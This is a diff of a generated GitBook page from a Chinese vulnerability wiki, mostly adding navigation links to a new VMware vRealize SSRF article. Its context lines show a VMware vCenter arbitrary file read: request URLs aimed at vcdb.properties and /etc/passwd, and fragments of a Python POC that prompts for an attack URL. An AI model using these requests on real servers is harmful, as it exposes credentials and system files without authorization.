@@ -110,7 +110,7 @@
     <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="../浪潮/" />
+    <link rel="next" href="VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975.html" />
     
     
     <link rel="prev" href="./" />
@@ -1350,6 +1350,19 @@
             
                     
                     VMware vCenter任意文件读取漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.9.2" data-path="VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975.html">
+            
+                <a href="VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975.html">
+            
+                    
+                    VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975
             
                 </a>
             
@@ -4020,20 +4033,20 @@
 <p>title=&quot;ID_VC_Welcome&quot;</p>
 </blockquote>
 <h2 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;">&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h2>
-<p><a href="image/vm-1.png" data-lightbox="677889de-ba41-4ae7-95e3-9b59d2335953" data-title=""><img src="image/vm-1.png" alt=""></a></p>
+<p><a href="image/vm-1.png" data-lightbox="59a3e199-acca-4251-bd27-f814f00c7aa6" data-title=""><img src="image/vm-1.png" alt=""></a></p>
 <p>&#x4F7F;&#x7528;POC&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;&#x70B9;</p>
 <blockquote>
 <p>[!NOTE]</p>
 <p>Windows&#x4E3B;&#x673A;</p>
 </blockquote>
 <pre><code>http://xxx.xxx.xxx.xxx/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
-</code></pre><p><a href="image/vm-2.png" data-lightbox="45f70a96-9f90-48f8-a308-5fdd39e01fda" data-title=""><img src="image/vm-2.png" alt=""></a></p>
+</code></pre><p><a href="image/vm-2.png" data-lightbox="466885d0-c597-4b66-be66-9793040fd63b" data-title=""><img src="image/vm-2.png" alt=""></a></p>
 <blockquote>
 <p>[!NOTE]</p>
 <p>Linux&#x4E3B;&#x673A;</p>
 </blockquote>
 <pre><code>https://xxx.xxx.xxx.xxx/eam/vib?id=/etc/passwd
-</code></pre><p><a href="image/vm-3.png" data-lightbox="371460c1-c76d-48cb-9b57-71c8152a7f37" data-title=""><img src="image/vm-3.png" alt=""></a></p>
+</code></pre><p><a href="image/vm-3.png" data-lightbox="25e00846-1886-4ea0-a907-3c53efea62df" data-title=""><img src="image/vm-3.png" alt=""></a></p>
 <h2 id="&#x6F0F;&#x6D1E;&#x5229;&#x7528;poc">&#x6F0F;&#x6D1E;&#x5229;&#x7528;POC</h2>
 <pre><code class="lang-python"><span class="hljs-keyword">import</span> requests
 <span class="hljs-keyword">import</span> sys
@@ -4077,7 +4090,7 @@
     target_url = str(input(<span class="hljs-string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))
     POC_1(target_url)
 </code></pre>
-<p><a href="image/vm-4.png" data-lightbox="6e6d87d1-ba13-4d82-9c6b-1ca7659fce3c" data-title=""><img src="image/vm-4.png" alt=""></a> </p>
+<p><a href="image/vm-4.png" data-lightbox="7b60c739-495e-4ba5-8b9d-7423af285944" data-title=""><img src="image/vm-4.png" alt=""></a> </p>
 <footer class="page-footer"><span class="copyright">PeiQi WiKi&#x6587;&#x5E93; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x6587;&#x4EF6;&#x66F4;&#x65B0;&#x65F6;&#x95F4;&#xFF1A;
 2021-02-27 10:42:23
 </span></footer>
@@ -4112,7 +4125,7 @@
                 </a>
                 
                 
-                <a href="../浪潮/" class="navigation navigation-next " aria-label="Next page: 浪潮">
+                <a href="VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975.html" class="navigation navigation-next " aria-label="Next page: VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -4123,7 +4136,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"VMware vCenter任意文件读取漏洞","level":"2.2.9.1","depth":3,"next":{"title":"浪潮","level":"2.2.10","depth":2,"path":"PeiQi_Wiki/服务器应用漏洞/浪潮/README.md","ref":"PeiQi_Wiki/服务器应用漏洞/浪潮/README.md","articles":[{"title":"浪潮ClusterEngineV4.0 远程命令执行漏洞","level":"2.2.10.1","depth":3,"path":"PeiQi_Wiki/服务器应用漏洞/浪潮/浪潮ClusterEngineV4.0 远程命令执行漏洞.md","ref":"PeiQi_Wiki/服务器应用漏洞/浪潮/浪潮ClusterEngineV4.0 远程命令执行漏洞.md","articles":[]}]},"previous":{"title":"VMware","level":"2.2.9","depth":2,"path":"PeiQi_Wiki/服务器应用漏洞/VMware/README.md","ref":"PeiQi_Wiki/服务器应用漏洞/VMware/README.md","articles":[{"title":"VMware vCenter任意文件读取漏洞","level":"2.2.9.1","depth":3,"path":"PeiQi_Wiki/服务器应用漏洞/VMware/VMware vCenter任意文件读取漏洞.md","ref":"PeiQi_Wiki/服务器应用漏洞/VMware/VMware vCenter任意文件读取漏洞.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","theme-comscore","splitter","alerts","chapter-fold","code","github","favicon","accordion","-lunr","-search","search-pro","emphasize","-sharing","sharing-plus","tbfed-pagefooter","lightbox","flexible-alerts","pageview-count","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"PeiQi WiKi文库","modify_label":"文件更新时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"emphasize":{},"github":{"url":"https://github.com/PeiQi0/PeiQi-WIKI"},"livereload":{},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":{},"lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"back-to-top-button":{},"pageview-count":{},"alerts":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"}},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"PeiQi","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"PeiQi WiKi文库","language":"zh-hans","gitbook":"*","description":"WiKi文库"},"file":{"path":"PeiQi_Wiki/服务器应用漏洞/VMware/VMware vCenter任意文件读取漏洞.md","mtime":"2021-02-27T02:42:23.928Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-03-31T01:26:15.597Z"},"basePath":"../../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"VMware vCenter任意文件读取漏洞","level":"2.2.9.1","depth":3,"next":{"title":"VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975","level":"2.2.9.2","depth":3,"path":"PeiQi_Wiki/服务器应用漏洞/VMware/VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975.md","ref":"PeiQi_Wiki/服务器应用漏洞/VMware/VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975.md","articles":[]},"previous":{"title":"VMware","level":"2.2.9","depth":2,"path":"PeiQi_Wiki/服务器应用漏洞/VMware/README.md","ref":"PeiQi_Wiki/服务器应用漏洞/VMware/README.md","articles":[{"title":"VMware vCenter任意文件读取漏洞","level":"2.2.9.1","depth":3,"path":"PeiQi_Wiki/服务器应用漏洞/VMware/VMware vCenter任意文件读取漏洞.md","ref":"PeiQi_Wiki/服务器应用漏洞/VMware/VMware vCenter任意文件读取漏洞.md","articles":[]},{"title":"VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975","level":"2.2.9.2","depth":3,"path":"PeiQi_Wiki/服务器应用漏洞/VMware/VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975.md","ref":"PeiQi_Wiki/服务器应用漏洞/VMware/VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","theme-comscore","splitter","alerts","chapter-fold","code","github","favicon","accordion","-lunr","-search","search-pro","emphasize","-sharing","sharing-plus","tbfed-pagefooter","lightbox","flexible-alerts","pageview-count","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"PeiQi WiKi文库","modify_label":"文件更新时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"emphasize":{},"github":{"url":"https://github.com/PeiQi0/PeiQi-WIKI"},"livereload":{},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":{},"lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"back-to-top-button":{},"pageview-count":{},"alerts":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"}},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"PeiQi","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"PeiQi WiKi文库","language":"zh-hans","gitbook":"*","description":"WiKi文库"},"file":{"path":"PeiQi_Wiki/服务器应用漏洞/VMware/VMware vCenter任意文件读取漏洞.md","mtime":"2021-02-27T02:42:23.928Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-03-31T08:26:58.534Z"},"basePath":"../../..","book":{"language":""}});
         });
     </script>
 </div>
